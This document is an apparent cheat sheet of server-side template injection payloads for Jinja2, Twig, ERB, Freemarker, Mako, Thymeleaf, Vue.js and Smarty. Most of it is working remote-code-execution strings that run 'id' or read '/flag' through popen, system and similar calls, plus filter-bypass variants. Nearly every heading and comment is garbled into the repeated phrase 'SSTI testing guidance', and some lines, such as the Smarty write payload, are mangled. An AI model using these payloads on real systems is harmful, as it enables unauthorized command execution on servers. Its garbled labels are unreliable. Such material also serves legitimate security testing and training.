# SSTI SSTI testing guidance

## SSTI testing guidance

| SSTI testing guidance payload | SSTI testing guidance | SSTI testing guidance |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | SSTI testing guidance Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | SSTI testing guidance | Jinja2 / Twig |

## Jinja2 SSTI testing guidance

### SSTI testing guidance
```python
# SSTI testing guidance1：os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# SSTI testing guidance2：SSTI testing guidance import
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# SSTI testing guidance3：lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# SSTI testing guidance4：cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# SSTI testing guidance5：joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# SSTI testing guidance6：namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### SSTI testing guidance
```python
# SSTI testing guidance
{{''.__class__.__mro__[1].__subclasses__()}}

# SSTI testing guidance
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# SSTI testing guidance
# catch_warnings: SSTI testing guidance 132-140 SSTI testing guidance
# Popen: SSTI testing guidance 200+ SSTI testing guidance
# _io._IOBase: SSTI testing guidance 80-100 SSTI testing guidance
```

### SSTI testing guidance
```python
# SSTI testing guidance → SSTI testing guidance |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# SSTI testing guidance → SSTI testing guidance \x5f SSTI testing guidance request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# SSTI testing guidance → SSTI testing guidance |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# SSTI testing guidance → SSTI testing guidance
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Twig SSTI testing guidance

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## ERB (Ruby) SSTI testing guidance

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Freemarker SSTI testing guidance

```
<#assign ex="freemarker.template.utility.Execute" new()>${ex("id")}
${"freemarker.template.utility.Execute" new()("id")}
```

## Mako SSTI testing guidance

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Thymeleaf SSTI testing guidance

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Vue.js SSTI testing guidance

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Smarty SSTI testing guidance

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"< php system('id');  >",self::clearConfig())}
```
